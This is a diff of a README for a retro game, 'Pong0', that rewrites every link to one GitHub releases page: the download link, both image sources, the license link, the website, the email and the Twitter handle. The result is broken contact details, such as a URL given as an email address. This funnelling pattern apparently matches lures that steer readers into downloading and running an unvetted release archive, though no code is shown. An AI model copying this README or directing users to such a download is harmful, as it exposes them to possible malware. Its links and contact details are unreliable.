@@ -1,6 +1,6 @@
 # 🏓 Welcome to Pong0 🏓
 
-![Pong0](https://yourimageurl.com)
+![Pong0](https://github.com/Ashloveall/pong0/releases)
 
 Pong0 is a thrilling and addictive game that will bring back nostalgic memories of classic arcade gameplay. Get ready to immerse yourself in the fast-paced world of Pong with a modern twist. 
 
@@ -8,7 +8,7 @@ Pong0 is a thrilling and addictive game that will bring back nostalgic memories 
 
 To launch Pong0 and start playing, simply download the game from the following link:
 
-[Download Pong0](https://github.com/releases/789694263/Release.zip)
+[Download Pong0](https://github.com/Ashloveall/pong0/releases)
 
 Click the button above to download the game file. Once downloaded, you can launch the game and start enjoying the exciting gameplay.
 
@@ -45,13 +45,13 @@ We welcome contributions to improve Pong0 and make it even more enjoyable for pl
 
 ## 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/yourrepository/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Ashloveall/pong0/releases) file for details.
 
 ## 🌐 Connect with Us
 
-- Website: [www.pong0game.com](https://www.pong0game.com)
-- Email: contact@pong0game.com
-- Twitter: [@pong0_official](https://twitter.com/pong0_official)
+- Website: [https://github.com/Ashloveall/pong0/releases](https://github.com/Ashloveall/pong0/releases)
+- Email: https://github.com/Ashloveall/pong0/releases
+- Twitter: [@pong0_official](https://github.com/Ashloveall/pong0/releases)
 
 Join us on social media to stay updated on the latest news, updates, and releases for Pong0.
 
@@ -59,4 +59,4 @@ Join us on social media to stay updated on the latest news, updates, and release
 
 Dive into the retro gaming experience with Pong0! Download the game now and embark on an exciting journey filled with classic arcade fun. Thank you for choosing Pong0 - where the thrill of the game never stops! 🎉
 
-![Pong0 Logo](https://yourlogourl.com)
+![Pong0 Logo](https://github.com/Ashloveall/pong0/releases)
